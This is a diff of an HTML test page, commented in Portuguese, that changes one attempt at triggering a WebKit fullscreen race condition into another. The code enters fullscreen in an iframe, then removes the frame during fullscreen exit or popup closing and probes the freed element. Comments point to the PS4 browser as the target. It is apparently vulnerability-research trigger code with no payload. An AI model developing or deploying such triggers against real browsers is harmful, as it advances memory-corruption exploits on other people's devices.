@@ -1,78 +1,71 @@
 <html>
 <body>
-<button id="run">Run V3</button>
+<button id="run">Run V1</button>
 <div id="status">Ready</div>
+<iframe id="testFrame" width="100" height="100"></iframe>
 <script>
 /*
-  VETOR: webkitExitFullscreen() + frame destruction race
-  Entra em fullscreen em elemento filho, confirma entrada,
-  então dispara webkitExitFullscreen() e remove() simultaneamente.
-  O rAF tenta dereferenciar o elemento no próximo frame de render
-  enquanto o Document está em teardown.
+  DIFERENÇA DO ORIGINAL: iframe.remove() síncrono logo após popup.close()
+  sem setInterval — tenta pegar o FullscreenManager antes de qualquer
+  cleanup agendado pelo fechamento do popup.
 */
 
-var iframe = null;
-var rafHandle = null;
+var iframe = document.getElementById("testFrame");
+var popup = null;
 
-function cleanup() {
-    if (rafHandle) cancelAnimationFrame(rafHandle);
-    rafHandle = null;
-}
+iframe.onload = function() {
+    var doc = iframe.contentDocument;
+    doc.open();
+    doc.write(
+        '<!DOCTYPE html><html><body>' +
+        '<div id="target" style="width:200px;height:150px;background:red"></div>' +
+        '</body></html>'
+    );
+    doc.close();
+};
+
+document.addEventListener('webkitfullscreenchange', function() {
+    var el = document.webkitFullscreenElement;
+    document.getElementById("status").innerHTML +=
+        " | fsChange: " + (el ? el.tagName : "null");
+    if (el) {
+        try {
+            document.getElementById("status").innerHTML +=
+                " w=" + el.clientWidth;
+        } catch(e) {
+            document.getElementById("status").innerHTML += " EX:" + e;
+        }
+    }
+});
 
 document.getElementById("run").onclick = function() {
-    cleanup();
+    popup = window.open("", "_blank", "width=400,height=300");
+    popup.document.open();
+    popup.document.write(
+        '<!DOCTYPE html><html><body><h3>Popup</h3></body></html>'
+    );
+    popup.document.close();
 
-    iframe = document.createElement("iframe");
-    iframe.style.width = "300px";
-    iframe.style.height = "300px";
-    document.body.appendChild(iframe);
+    var frameDocument = iframe.contentDocument;
+    frameDocument.documentElement.webkitRequestFullscreen();
 
-    iframe.onload = function() {
-        var iDoc = iframe.contentDocument;
-        iDoc.open();
-        iDoc.write('<html><body style="margin:0"><div id="fs" style="width:100%;height:100%;background:purple"></div></body></html>');
-        iDoc.close();
+    setTimeout(function() {
+        if (!popup || popup.closed) return;
 
-        var fsEl = iDoc.getElementById("fs");
+        popup.focus();
+        window.focus();
+        iframe.contentWindow.focus();
 
-        // Fullscreen em elemento filho (não documentElement)
-        // FullscreenManager guarda ponteiro específico para este Element
-        fsEl.webkitRequestFullscreen();
+        setTimeout(function() {
+            if (popup && !popup.closed) popup.close();
 
-        document.addEventListener('webkitfullscreenchange', function onEnter() {
-            if (!document.webkitFullscreenElement) return;
-            document.removeEventListener('webkitfullscreenchange', onEnter);
+            // Remove IMEDIATAMENTE após close — sem setInterval
+            iframe.remove();
 
             document.getElementById("status").innerHTML =
-                "Fullscreen ativo — disparando race";
-
-            // RAF acessa o elemento no próximo frame de render
-            // Este frame pode coincidir com o teardown do Document
-            rafHandle = requestAnimationFrame(function rafTick() {
-                try {
-                    var bounds = fsEl.getBoundingClientRect();
-                    document.getElementById("status").innerHTML +=
-                        " | rAF: bounds=" + JSON.stringify(bounds);
-                } catch(e) {
-                    document.getElementById("status").innerHTML +=
-                        " | rAF EX:" + e;
-                }
-                rafHandle = requestAnimationFrame(rafTick);
-            });
-
-            // Webkit-prefixado — único que existe no PS4
-            document.webkitExitFullscreen();
-
-            // Document teardown enquanto webkitExitFullscreen processa
-            iframe.remove();
-            iframe = null;
-
-            document.getElementById("status").innerHTML +=
-                " | exit+remove fired";
-
-            setTimeout(cleanup, 200);
-        });
-    };
+                "iframe removed sync after popup.close()";
+        }, 300);
+    }, 300);
 };
 </script>
 </body>
